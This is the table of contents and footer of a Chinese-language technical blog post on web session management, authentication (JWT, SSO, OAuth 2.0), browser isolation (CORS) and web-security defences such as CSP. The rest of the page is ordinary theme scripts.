toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">Web 会话与身份认证全景</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A8%E6%99%AF%E9%97%AE%E9%A2%98%E9%93%BE"><span class="toc-number">1.1.</span> <span class="toc-text">全景问题链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E5%BC%8F%E6%80%BB%E8%A7%88"><span class="toc-number">1.2.</span> <span class="toc-text">模式总览</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#part-1%EF%BC%9A%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86-%E5%A6%82%E4%BD%95%E8%AE%B0%E4%BD%8F%E7%94%A8%E6%88%B7%EF%BC%9F"><span class="toc-number">1.3.</span> <span class="toc-text">Part 1：会话管理——如何记住用户？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E5%9F%BA%E7%A1%80"><span class="toc-number">1.3.1.</span> <span class="toc-text">会话管理基础</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E7%A7%8D%E4%BC%9A%E8%AF%9D-id-%E8%BD%BD%E4%BD%93"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">三种会话 ID 载体</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cookie-session-%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">Cookie-Session 工作流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tomcat-session-%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">Tomcat Session 实现</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cookie-%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90"><span class="toc-number">1.3.2.</span> <span class="toc-text">Cookie 深入解析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%AD%E5%A4%A7%E5%B1%9E%E6%80%A7"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">六大属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#domain-%E5%8C%B9%E9%85%8D%E8%A7%84%E5%88%99"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">Domain 匹配规则</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#path-%E5%8C%B9%E9%85%8D%E8%A7%84%E5%88%99"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">Path 匹配规则</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4-set-cookie-%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.3.2.4.</span> <span class="toc-text">完整 Set-Cookie 示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#samesite-%E5%B1%9E%E6%80%A7"><span class="toc-number">1.3.2.5.</span> <span class="toc-text">SameSite 属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%96%B9-cookie-%E4%B8%8E%E9%9A%90%E7%A7%81"><span class="toc-number">1.3.2.6.</span> <span class="toc-text">第三方 Cookie 与隐私</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E5%B8%83%E5%BC%8F-session-%E6%96%B9%E6%A1%88"><span class="toc-number">1.3.3.</span> <span class="toc-text">分布式 Session 方案</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%9B%E7%A7%8D%E6%96%B9%E6%A1%88%E5%AF%B9%E6%AF%94"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">四种方案对比</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#session-%E5%A4%8D%E5%88%B6%E7%9A%84%E7%BD%91%E7%BB%9C%E9%A3%8E%E6%9A%B4"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">Session 复制的网络风暴</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B2%98%E6%80%A7-session-%E7%9A%84%E6%95%85%E9%9A%9C%E5%9C%BA%E6%99%AF"><span class="toc-number">1.3.3.3.</span> <span class="toc-text">粘性 Session 的故障场景</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9B%86%E4%B8%AD%E5%AD%98%E5%82%A8%E6%96%B9%E6%A1%88-%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E9%A6%96%E9%80%89"><span class="toc-number">1.3.3.4.</span> <span class="toc-text">集中存储方案（生产环境首选）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#part-2%EF%BC%9A%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81-%E5%A6%82%E4%BD%95%E8%AF%81%E6%98%8E%E8%BA%AB%E4%BB%BD%EF%BC%9F"><span class="toc-number">1.4.</span> <span class="toc-text">Part 2：身份认证——如何证明身份？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#http-%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF%E6%BC%94%E8%BF%9B"><span class="toc-number">1.4.1.</span> <span class="toc-text">HTTP 认证技术演进</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E7%A7%8D%E8%AE%A4%E8%AF%81%E6%96%B9%E6%A1%88%E6%A6%82%E8%A7%88"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">三种认证方案概览</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#basic-%E8%AE%A4%E8%AF%81"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">Basic 认证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#digest-%E8%AE%A4%E8%AF%81"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">Digest 认证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bearer-token-%E8%AE%A4%E8%AF%81"><span class="toc-number">1.4.1.4.</span> <span class="toc-text">Bearer Token 认证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E7%A7%8D%E6%96%B9%E6%A1%88%E5%AE%89%E5%85%A8%E6%80%A7%E5%AF%B9%E6%AF%94"><span class="toc-number">1.4.1.5.</span> <span class="toc-text">三种方案安全性对比</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%86%E5%8F%B2%E6%BC%94%E8%BF%9B%E6%97%B6%E9%97%B4%E7%BA%BF"><span class="toc-number">1.4.1.6.</span> <span class="toc-text">历史演进时间线</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.4.1.7.</span> <span class="toc-text">实践建议</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%95%E6%97%B6%E4%BD%BF%E7%94%A8-basic-%E8%AE%A4%E8%AF%81"><span class="toc-number">1.4.1.7.1.</span> <span class="toc-text">何时使用 Basic 认证</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%95%E6%97%B6%E4%BD%BF%E7%94%A8-digest-%E8%AE%A4%E8%AF%81"><span class="toc-number">1.4.1.7.2.</span> <span class="toc-text">何时使用 Digest 认证</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%95%E6%97%B6%E4%BD%BF%E7%94%A8-bearer-token"><span class="toc-number">1.4.1.7.3.</span> <span class="toc-text">何时使用 Bearer Token</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5"><span class="toc-number">1.4.1.7.4.</span> <span class="toc-text">安全最佳实践</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jwt-%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90"><span class="toc-number">1.4.2.</span> <span class="toc-text">JWT 深入解析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#jwt-%E7%BB%93%E6%9E%84"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">JWT 结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%87%E5%87%86%E5%A3%B0%E6%98%8E%E5%AD%97%E6%AE%B5-rfc-7519-4-1"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">标准声明字段（RFC 7519 §4.1）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AD%BE%E5%90%8D%E7%AE%97%E6%B3%95"><span class="toc-number">1.4.2.3.</span> <span class="toc-text">签名算法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jwt-%E7%9A%84%E6%92%A4%E9%94%80%E9%9A%BE%E9%A2%98"><span class="toc-number">1.4.2.4.</span> <span class="toc-text">JWT 的撤销难题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jwt-%E5%88%B7%E6%96%B0%E6%B5%81%E7%A8%8B"><span class="toc-number">1.4.2.5.</span> <span class="toc-text">JWT 刷新流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#session-vs-jwt-%E5%86%B3%E7%AD%96"><span class="toc-number">1.4.2.6.</span> <span class="toc-text">Session vs JWT 决策</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sso-%E5%8D%95%E7%82%B9%E7%99%BB%E5%BD%95"><span class="toc-number">1.4.3.</span> <span class="toc-text">SSO 单点登录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cas-%E5%8D%8F%E8%AE%AE%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">CAS 协议工作流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cas-%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5"><span class="toc-number">1.4.3.2.</span> <span class="toc-text">CAS 核心概念</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sso-%E5%8D%95%E7%82%B9%E7%99%BB%E5%87%BA"><span class="toc-number">1.4.3.3.</span> <span class="toc-text">SSO 单点登出</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%A8%E5%9F%9F-sso"><span class="toc-number">1.4.3.4.</span> <span class="toc-text">跨域 SSO</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#oauth-2-0-%E6%8E%88%E6%9D%83%E6%A1%86%E6%9E%B6"><span class="toc-number">1.4.4.</span> <span class="toc-text">OAuth 2.0 授权框架</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%9B%E4%B8%AA%E8%A7%92%E8%89%B2"><span class="toc-number">1.4.4.1.</span> <span class="toc-text">四个角色</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%88%E6%9D%83%E7%A0%81%E6%A8%A1%E5%BC%8F-authorization-code"><span class="toc-number">1.4.4.2.</span> <span class="toc-text">授权码模式（Authorization Code）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%8E%88%E6%9D%83%E6%A8%A1%E5%BC%8F"><span class="toc-number">1.4.4.3.</span> <span class="toc-text">其他授权模式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#oauth-2-0-token-%E5%88%B7%E6%96%B0%E6%B5%81%E7%A8%8B"><span class="toc-number">1.4.4.4.</span> <span class="toc-text">OAuth 2.0 Token 刷新流程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#part-3%EF%BC%9A%E5%AE%89%E5%85%A8%E8%BE%B9%E7%95%8C-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%A6%82%E4%BD%95%E9%9A%94%E7%A6%BB%EF%BC%9F"><span class="toc-number">1.5.</span> <span class="toc-text">Part 3：安全边界——浏览器如何隔离？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E4%B8%8E%E8%B7%A8%E5%9F%9F"><span class="toc-number">1.5.1.</span> <span class="toc-text">同源策略与跨域</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5-same-origin-policy"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">同源策略（Same-Origin Policy）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cors-cross-origin-resource-sharing"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">CORS（Cross-Origin Resource Sharing）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E8%AF%B7%E6%B1%82-vs-%E9%A2%84%E6%A3%80%E8%AF%B7%E6%B1%82"><span class="toc-number">1.5.1.2.1.</span> <span class="toc-text">简单请求 vs 预检请求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%A2%84%E6%A3%80%E8%AF%B7%E6%B1%82%E6%B5%81%E7%A8%8B"><span class="toc-number">1.5.1.2.2.</span> <span class="toc-text">预检请求流程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%93%8D%E5%BA%94%E5%A4%B4"><span class="toc-number">1.5.1.2.3.</span> <span class="toc-text">关键响应头</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%90%BA%E5%B8%A6-cookie-%E7%9A%84%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82"><span class="toc-number">1.5.1.2.4.</span> <span class="toc-text">携带 Cookie 的跨域请求</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jsonp-%E5%8E%86%E5%8F%B2%E6%96%B9%E6%A1%88"><span class="toc-number">1.5.1.3.</span> <span class="toc-text">JSONP（历史方案）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#part-4%EF%BC%9A%E6%94%BB%E9%98%B2%E4%B8%8E%E9%98%B2%E6%8A%A4-%E5%A6%82%E4%BD%95%E5%85%9C%E5%BA%95%EF%BC%9F"><span class="toc-number">1.6.</span> <span class="toc-text">Part 4：攻防与防护——如何兜底？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2"><span class="toc-number">1.6.1.</span> <span class="toc-text">Web 安全攻防</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E5%A4%A7%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B%E6%A6%82%E8%A7%88"><span class="toc-number">1.6.1.1.</span> <span class="toc-text">三大攻击类型概览</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xss-cross-site-scripting"><span class="toc-number">1.6.1.2.</span> <span class="toc-text">XSS（Cross-Site Scripting）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%89%E7%A7%8D-xss-%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.6.1.2.1.</span> <span class="toc-text">三种 XSS 类型</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B-xss-%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">1.6.1.2.2.</span> <span class="toc-text">存储型 XSS 攻击流程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B-xss-%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">1.6.1.2.3.</span> <span class="toc-text">反射型 XSS 攻击流程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#dom-%E5%9E%8B-xss"><span class="toc-number">1.6.1.2.4.</span> <span class="toc-text">DOM 型 XSS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#xss-%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">1.6.1.2.5.</span> <span class="toc-text">XSS 防御措施</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#csrf-cross-site-request-forgery"><span class="toc-number">1.6.1.3.</span> <span class="toc-text">CSRF（Cross-Site Request Forgery）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#csrf-%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">1.6.1.3.1.</span> <span class="toc-text">CSRF 攻击流程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#csrf-token-%E9%98%B2%E5%BE%A1%E6%B5%81%E7%A8%8B"><span class="toc-number">1.6.1.3.2.</span> <span class="toc-text">CSRF Token 防御流程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#csrf-%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">1.6.1.3.3.</span> <span class="toc-text">CSRF 防御措施</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ssrf-server-side-request-forgery"><span class="toc-number">1.6.1.4.</span> <span class="toc-text">SSRF（Server-Side Request Forgery）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ssrf-%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">1.6.1.4.1.</span> <span class="toc-text">SSRF 攻击流程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ssrf-%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">1.6.1.4.2.</span> <span class="toc-text">SSRF 防御措施</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#csp-%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5"><span class="toc-number">1.6.2.</span> <span class="toc-text">CSP 内容安全策略</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#csp-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">1.6.2.1.</span> <span class="toc-text">CSP 工作原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#csp-%E6%8C%87%E4%BB%A4%E9%80%9F%E6%9F%A5"><span class="toc-number">1.6.2.2.</span> <span class="toc-text">CSP 指令速查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#csp-%E5%80%BC%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.6.2.3.</span> <span class="toc-text">CSP 值类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.6.2.4.</span> <span class="toc-text">实战配置模板</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9D%E8%A7%84%E6%8A%A5%E5%91%8A%E4%B8%8E%E7%9B%91%E6%8E%A7"><span class="toc-number">1.6.2.5.</span> <span class="toc-text">违规报告与监控</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E6%94%BB%E5%87%BB%E6%8B%A6%E6%88%AA%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.6.2.6.</span> <span class="toc-text">实际攻击拦截示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8D%A0%E6%AF%94%E4%B8%8E-csp-%E7%9A%84%E9%87%8D%E8%A6%81%E6%80%A7"><span class="toc-number">1.6.2.7.</span> <span class="toc-text">漏洞占比与 CSP 的重要性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E8%AF%AF%E5%8C%BA"><span class="toc-number">1.6.2.8.</span> <span class="toc-text">常见误区</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#meta-%E6%A0%87%E7%AD%BE%E4%B8%8E%E5%93%8D%E5%BA%94%E5%A4%B4%E5%AF%B9%E6%AF%94"><span class="toc-number">1.6.2.9.</span> <span class="toc-text">&lt;meta&gt; 标签与响应头对比</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E5%BC%8F%E9%80%9F%E6%9F%A5%E8%A1%A8"><span class="toc-number">1.7.</span> <span class="toc-text">模式速查表</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2017 - 2026 By magicliang</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional and Simplified Chinese">簡</button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><script src="/js/tw_cn.js?v=5.5.2"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
  const runMermaid = ele => {
    window.loadMermaid = true
    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

    ele.forEach((item, index) => {
      const mermaidSrc = item.firstElementChild
      const config = mermaidSrc.dataset.config ? JSON.parse(mermaidSrc.dataset.config) : {}
      if (!config.theme) {
        config.theme = theme
      }
      const mermaidThemeConfig = `%%{init: ${JSON.stringify(config)}}%%\n`
      const mermaidID = `mermaid-${index}`
      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent

      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
      const renderMermaid = svg => {
        mermaidSrc.insertAdjacentHTML('afterend', svg)
      }

      // mermaid v9 and v10 compatibility
      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
    })
  }

  const codeToMermaid = () => {
    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
    if (codeMermaidEle.length === 0) return

    codeMermaidEle.forEach(ele => {
      const preEle = document.createElement('pre')
      preEle.className = 'mermaid-src'
      preEle.hidden = true
      preEle.textContent = ele.textContent
      const newEle = document.createElement('div')
      newEle.className = 'mermaid-wrap'
      newEle.appendChild(preEle)
      ele.parentNode.replaceWith(newEle)
    })
  }

  const loadMermaid = () => {
    if (true) codeToMermaid()
    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
    if ($mermaid.length === 0) return

    const runMermaidFn = () => runMermaid($mermaid)
    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@11.12.1/dist/mermaid.min.js').then(runMermaidFn)
  }

  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
})()</script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="/"></script></div></body></html>